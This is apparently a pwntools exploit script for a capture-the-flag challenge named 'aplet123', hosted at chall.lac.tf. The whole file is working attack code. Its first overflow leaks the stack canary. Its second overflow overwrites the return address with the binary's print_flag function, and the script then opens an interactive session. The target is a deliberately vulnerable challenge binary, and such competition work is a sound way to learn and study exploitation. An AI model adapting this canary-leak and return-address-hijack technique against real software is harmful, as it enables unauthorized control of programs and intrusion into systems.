#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("aplet123_patched")

context.binary = exe

host = "chall.lac.tf"
port = 31123

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
c
'''.format(**locals())

# shortcut lambda
info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

io = start()

# good luck pwning :)

payload = b"i'm\n"
padding_size = 72+1
padding = (padding_size - len(payload)) * b"a"
payload = padding + payload

sa(b"hello\n", payload)

canary = u64(io.recvline()[3:10].rjust(8, b"\x00"))

log.success(f"canary: {hex(canary)}")

payload = b"a"*72 + p64(canary) + b"a"*8 + p64(exe.symbols['print_flag'])

sl(payload)
sl(b"bye")

io.interactive()

